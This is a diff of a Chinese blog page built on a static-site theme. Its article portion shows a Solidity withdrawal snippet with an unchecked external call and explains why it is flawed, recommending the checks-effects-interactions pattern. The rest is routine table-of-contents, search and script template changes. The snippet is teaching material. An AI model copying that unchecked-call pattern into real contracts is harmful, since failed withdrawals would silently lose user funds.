+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">balances[msg.sender]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">-=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">amount;            </span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">msg.sender.call.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">value</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(amount)();</span></span>
+<span class="line"></span></code></pre></div>
 <p>但是，这里仍然存在一个新问题：如果提现失败，交易并不会回滚，此时 <code>balances[msg.sender]</code> 已清空</p>
 <p>所以，应该采用 <em>checks-effects-interactions</em> 模式，使用 <code>require</code> 语句进行检查</p>
 </li>
@@ -759,12 +832,32 @@
     <div class="side-col d-none d-lg-block col-lg-2">
       
   <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
+    <div id="toc" data-toc-script="https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js">
   <p class="toc-header">
-    <i class="iconfont icon-list"></i>
+    <i class="iconfont icon-list" aria-hidden="true"></i>
     <span>目录</span>
   </p>
-  <div class="toc-body" id="toc-body"></div>
+  <nav class="toc-body" id="toc-body" aria-label="目录"></nav>
+</div>
+
+<button id="mobile-toc-toggle" class="mobile-toc-toggle d-lg-none" type="button" hidden
+        aria-controls="mobile-toc-dialog" aria-expanded="false" aria-haspopup="dialog">
+  <i class="iconfont icon-list" aria-hidden="true"></i> 目录
+</button>
+<div id="mobile-toc-dialog" class="modal" tabindex="-1" role="dialog"
+     aria-modal="true" aria-labelledby="mobile-toc-title" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 id="mobile-toc-title" class="modal-title w-100 font-weight-bold">目录</h4>
+        <button type="button" class="close" data-dismiss="modal"
+                aria-label="关闭">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3"></div>
+    </div>
+  </div>
 </div>
 
 
@@ -807,14 +900,9 @@
 
   <script>
   Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
-    mermaid.initialize({"theme":"default"});
-
-    Fluid.utils.listenDOMLoaded(function() {
-      Fluid.events.registerRefreshCallback(function() {
-        if ('mermaid' in window) {
-          mermaid.init();
-        }
-      });
+    mermaid.initialize({ startOnLoad: false });
+    Fluid.utils.createScript('/js/mermaid.js', function() {
+      Fluid.initMermaid({"theme":"default"}, true);
     });
   });
 </script>
@@ -833,22 +921,22 @@
     
 
     
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="local-search-title" aria-hidden="true">
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+      <div class="modal-header search-header">
+        <h4 id="local-search-title" class="sr-only">搜索</h4>
+        <label class="sr-only" for="local-search-input">关键词</label>
+        <i class="iconfont icon-search" aria-hidden="true"></i>
+        <input type="search" id="local-search-input" autocomplete="off" spellcheck="false"
+               placeholder="关键词" aria-describedby="local-search-status" aria-controls="local-search-result">
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="关闭">
           <span aria-hidden="true">&times;</span>
         </button>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
+      <div class="modal-body search-body">
+        <p id="local-search-status" role="status" aria-live="polite" aria-atomic="true"></p>
+        <div id="local-search-result" aria-busy="false"></div>
       </div>
     </div>
   </div>
@@ -946,21 +1034,6 @@
 <script  src="/js/plugins.js" ></script>
 
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
 
 
 
@@ -971,109 +1044,7 @@
 
 
 
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    function isExpandAllEnabled() {
-      return CONFIG.toc && CONFIG.toc.expand_all === true;
-    }
-    function expandAllToc() {
-      if (!isExpandAllEnabled()) { return; }
-      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
-    }
-    function updateTocToggle($li, $childList) {
-      var $toggle = $li.children('.toc-toggle');
-      if ($toggle.length === 0) { return; }
-      var collapsed = $childList.hasClass('tocbot-is-collapsed');
-      $toggle
-        .toggleClass('toc-toggle-collapsed', collapsed)
-        .toggleClass('toc-toggle-expanded', !collapsed);
-    }
-    function bindTocToggle() {
-      if (!isExpandAllEnabled()) { return; }
-      jQuery('#toc-body .toc-list-item').each(function() {
-        var $li = jQuery(this);
-        var $childList = $li.children('ol');
-        if ($childList.length === 0) {
-          if ($li.children('.toc-toggle').length === 0) {
-            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
-          }
-          return;
-        }
-
-        if ($li.children('.toc-toggle').length === 0) {
-          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
-        }
-        updateTocToggle($li, $childList);
-      });
-      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        var $li = jQuery(this).parent('.toc-list-item');
-        var $childList = $li.children('ol');
-        if ($childList.length === 0) { return; }
-        $childList.toggleClass('tocbot-is-collapsed');
-        updateTocToggle($li, $childList);
-      });
-      if (!window.__tocToggleObserver) {
-        window.__tocToggleObserver = new MutationObserver(function(mutations) {
-          mutations.forEach(function(mutation) {
-            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
-            var $list = jQuery(mutation.target);
-            var $li = $list.parent('.toc-list-item');
-            if ($li.length === 0) { return; }
-            updateTocToggle($li, $list);
-          });
-        });
-        jQuery('#toc-body ol').each(function() {
-          window.__tocToggleObserver.observe(this, { attributes: true });
-        });
-      }
-    }
-    var tocConfig = Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc);
-    if (isExpandAllEnabled()) {
-      tocConfig.collapseDepth = 6;
-    }
-    window.tocbot.init(tocConfig);
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-    expandAllToc();
-    bindTocToggle();
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-        expandAllToc();
-        bindTocToggle();
-      }
-    });
-  });
-</script>
-
+  <script  src="/js/toc.js" ></script>
 
   <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
